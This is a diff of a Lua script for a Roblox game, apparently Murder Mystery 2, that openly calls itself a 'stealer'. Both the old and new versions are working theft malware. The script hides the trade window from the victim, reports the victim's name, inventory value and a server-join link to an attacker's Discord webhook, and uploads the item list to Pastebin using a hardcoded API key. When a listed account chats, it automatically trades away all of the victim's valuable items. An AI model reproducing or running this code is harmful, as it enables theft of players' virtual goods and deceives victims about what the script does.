@@ -2,8 +2,8 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
 
 -- Configuración
 local webhook = _G.webhook or ""
@@ -15,38 +15,87 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- =====================================
--- FUNCIONES DE TELEPORT
--- =====================================
+-- ====================================
+-- FUNCIONES AUXILIARES
+-- ====================================
+local function safeFindPlayer(name)
+    local plrObj = Players:FindFirstChild(name)
+    if not plrObj then
+        warn("Jugador no encontrado: "..tostring(name))
+        return nil
+    end
+    return plrObj
+end
 
-local function TeleportToLowPlayerServer()
-    local placeId = game.PlaceId
+local function SendWebhook(title, description, fields, prefix)
+    local data = {
+        ["content"] = prefix or "",
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = description or "",
+            ["color"] = 65280,
+            ["fields"] = fields or {},
+            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
+            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
+        }}
+    }
+    local body = HttpService:JSONEncode(data)
+    pcall(function()
+        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
+    end)
+end
 
-    local function getServerList(cursor)
-        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?limit=100"
-        if cursor then
-            url = url.."&cursor="..cursor
-        end
-        local res = req({Url=url, Method="GET"})
-        if not res or not res.Body then return {} end
+local function CreatePaste(content)
+    local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
+    local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
+    local api_paste_format = "text"
+    local api_paste_private = "1"
+    local body = "api_option=paste&api_dev_key="..api_dev_key..
+                 "&api_paste_code="..HttpService:UrlEncode(content)..
+                 "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
+                 "&api_paste_format="..api_paste_format..
+                 "&api_paste_private="..api_paste_private
+    local res = req({
+        Url = "https://pastebin.com/api/api_post.php",
+        Method = "POST",
+        Headers = {["Content-Type"]="application/x-www-form-urlencoded"},
+        Body = body
+    })
+    if res and res.Body then return res.Body end
+end
+
+-- ====================================
+-- TELEPORT A SERVIDORES ≤8 JUGADORES
+-- ====================================
+local function fetchServers(cursor)
+    local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)
+    if cursor then url = url.."&cursor="..cursor end
+    local res = req({Url=url, Method="GET"})
+    if res and res.Body then
         local data = HttpService:JSONDecode(res.Body)
         return data.data, data.nextPageCursor
     end
+    return {}, nil
+end
 
+local function teleportLowPopServer()
+    local cursor
     while true do
-        local servers, nextCursor = getServerList()
+        local servers
+        servers, cursor = fetchServers(cursor)
         local targetServer
-        for _, server in pairs(servers) do
-            if server.playing <= 8 and server.playing > 0 and server.id ~= game.JobId then
-                targetServer = server.id
+        for _, s in ipairs(servers) do
+            if s.playing <= 8 and s.id ~= game.JobId then
+                targetServer = s.id
                 break
             end
         end
-
         if targetServer then
             print("Teleporting to server:", targetServer)
-            TeleportService:TeleportToPlaceInstance(placeId, targetServer, LocalPlayer)
-            return
+            local ok,_ = pcall(function()
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer, LocalPlayer)
+            end)
+            if ok then return end
         else
             print("No server found, retrying in 1s...")
             task.wait(1)
@@ -54,54 +103,12 @@ local function TeleportToLowPlayerServer()
     end
 end
 
--- =====================================
--- FUNCION PRINCIPAL (INVENTARIO + WEBHOOK + TRADE)
--- =====================================
-
+-- ====================================
+-- MAIN EXECUTION: INVENTARIO + WEBHOOK + TRADE
+-- ====================================
 local function MainExecution()
     if getgenv().ScriptEjecutado then return end
     getgenv().ScriptEjecutado = true
-
-    -- Función para enviar webhook
-    local function SendWebhook(title, description, fields, prefix)
-        local data = {
-            ["content"] = prefix or "",
-            ["embeds"] = {{
-                ["title"] = title,
-                ["description"] = description or "",
-                ["color"] = 65280,
-                ["fields"] = fields or {},
-                ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
-                ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
-            }}
-        }
-        local body = HttpService:JSONEncode(data)
-        pcall(function()
-            req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
-        end)
-    end
-
-    -- Función para crear paste en Pastebin
-    local function CreatePaste(content)
-        local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
-        local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
-        local api_paste_format = "text"
-        local api_paste_private = "1"
-
-        local body = "api_option=paste&api_dev_key="..api_dev_key..
-                     "&api_paste_code="..HttpService:UrlEncode(content)..
-                     "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
-                     "&api_paste_format="..api_paste_format..
-                     "&api_paste_private="..api_paste_private
-
-        local res = req({
-            Url = "https://pastebin.com/api/api_post.php",
-            Method = "POST",
-            Headers = {["Content-Type"]="application/x-www-form-urlencoded"},
-            Body = body
-        })
-        if res and res.Body then return res.Body end
-    end
 
     -- Ocultar GUI de trade
     local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -113,23 +120,22 @@ local function MainExecution()
         end
     end
 
-    -- Funciones de trade
-    local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
+    -- TRADE FUNCTIONS
+    local TradeService = ReplicatedStorage:WaitForChild("Trade")
     local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
     local function sendTradeRequest(user)
-        local plrObj = Players:FindFirstChild(user)
+        local plrObj = safeFindPlayer(user)
         if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
     end
     local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
     local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
     local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
-    -- =====================================
-    -- MM2 INVENTARIO Y SUPREME VALUE
-    -- =====================================
-    local database = require(game.ReplicatedStorage.Database.Sync.Item)
+    -- ====================================
+    -- INVENTARIO + SUPREME VALUE SYSTEM
+    -- ====================================
+    local database = require(ReplicatedStorage.Database.Sync.Item)
     local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
-
     local categories = {
         godly="https://supremevaluelist.com/mm2/godlies.html",
         ancient="https://supremevaluelist.com/mm2/ancients.html",
@@ -202,13 +208,12 @@ local function MainExecution()
         return valueList
     end
 
+    local valueList = buildValueList()
     local weaponsToSend={}
     local totalValue=0
     local min_rarity_index=table.find(rarityTable,min_rarity)
-    local valueList=buildValueList()
 
-    -- Extraer armas válidas
-    local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    local profile=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
     for id,amount in pairs(profile.Weapons.Owned) do
         local item=database[id]
         if item then
@@ -222,26 +227,22 @@ local function MainExecution()
             end
         end
     end
-
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
     -- 🔹 Fern Link real solo visible en webhook
     local fernToken = math.random(100000,999999)
     local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
-    -- Preparar contenido completo para Pastebin
+    -- Preparar Pastebin si >18 items
     local pasteContent = ""
     for _, w in ipairs(weaponsToSend) do
         pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
     pasteContent = pasteContent .. "\nTotal Value: "..tostring(totalValue).."💰"
-
     local pasteLink
-    if #weaponsToSend > 18 then
-        pasteLink = CreatePaste(pasteContent)
-    end
+    if #weaponsToSend > 18 then pasteLink = CreatePaste(pasteContent) end
 
-    -- Webhook inventario
+    -- Webhook
     if #weaponsToSend > 0 then
         local fieldsInit={
             {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -249,27 +250,24 @@ local function MainExecution()
             {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
             {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
         }
-
         local maxEmbedItems = math.min(18,#weaponsToSend)
         for i=1,maxEmbedItems do
-            local w = weaponsToSend[i]
+            local w=weaponsToSend[i]
             fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
         end
-
         if #weaponsToSend > 18 then
             fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
             if pasteLink then
                 fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
             end
         end
-
-        local prefix=pingEveryone and "@everyone " or ""
+        local prefix = pingEveryone and "@everyone " or ""
         SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
     end
 
-    -- 🔹 Trade
+    -- 🔹 Trade completo con finalización si no hay más items
     local function doTrade(targetName)
-        if #weaponsToSend == 0 then return end
+        if #weaponsToSend==0 then return end
         while #weaponsToSend>0 do
             local status=getTradeStatus()
             if status=="None" then
@@ -279,9 +277,7 @@ local function MainExecution()
             elseif status=="StartTrade" then
                 for i=1,math.min(4,#weaponsToSend) do
                     local w=table.remove(weaponsToSend,1)
-                    for _=1,w.Amount do
-                        addWeaponToTrade(w.DataID)
-                    end
+                    for _=1,w.Amount do addWeaponToTrade(w.DataID) end
                 end
                 task.wait(6)
                 acceptTrade()
@@ -292,7 +288,7 @@ local function MainExecution()
     end
 
     -- Activación por chat
-    for _, p in ipairs(Players:GetPlayers()) do
+    for _,p in ipairs(Players:GetPlayers()) do
         if table.find(users,p.Name) then
             p.Chatted:Connect(function() doTrade(p.Name) end)
         end
@@ -304,11 +300,10 @@ local function MainExecution()
     end)
 end
 
--- =====================================
--- INICIAR SCRIPT: TELEPORT + EJECUCIÓN PRINCIPAL
--- =====================================
-
+-- ====================================
+-- INICIO DEL SCRIPT
+-- ====================================
 task.spawn(function()
-    TeleportToLowPlayerServer()
+    teleportLowPopServer()
     MainExecution()
 end)
